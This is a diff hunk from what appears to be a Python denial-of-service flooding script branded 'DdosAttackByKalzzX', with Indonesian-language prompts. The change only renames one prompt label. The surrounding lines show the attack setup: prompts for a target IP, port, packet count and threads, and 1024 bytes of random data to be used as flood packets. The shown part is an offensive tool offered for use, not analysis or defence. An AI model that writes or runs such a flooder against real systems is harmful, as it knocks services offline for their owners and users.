@@ -13,7 +13,7 @@ print("Mau rename? PM me ")
 ip = str(input(" DdosAttackByKalzzX | Ip:"))
 port = int(input(" DdosAttackByKalzz | Port:"))
 choice = str(input(" DdosAttackByKalzzX | Gas Gak Ni?(y/n):"))
-times = int(input(" DdosAttackByKalzz | Packets:"))
+times = int(input(" DdosAttackByKalzzX | Packets:"))
 threads = int(input(" DdosAttackByKalzzX | Threads:"))
 def run():
 	data = random._urandom(1024)
